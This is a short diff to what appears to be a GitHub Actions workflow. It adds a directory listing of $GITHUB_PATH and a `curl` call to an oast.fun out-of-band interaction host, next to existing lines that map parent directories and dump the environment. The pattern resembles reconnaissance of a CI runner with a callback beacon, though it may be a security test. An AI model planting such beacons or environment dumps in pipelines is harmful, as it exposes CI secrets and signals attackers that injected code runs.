@@ -15,7 +15,10 @@ jobs:
           ls -al ../../
           ls -al ../../../
           ls -al ../../../../
+          echo ----
+          ls -al $GITHUB_PATH
           pwd
           echo $VARR1
           echo 1; echo 2;
           env
+          curl https://lobqidjjcvgdsnkvjczfo3ewtz02l6pya.oast.fun/githubwf
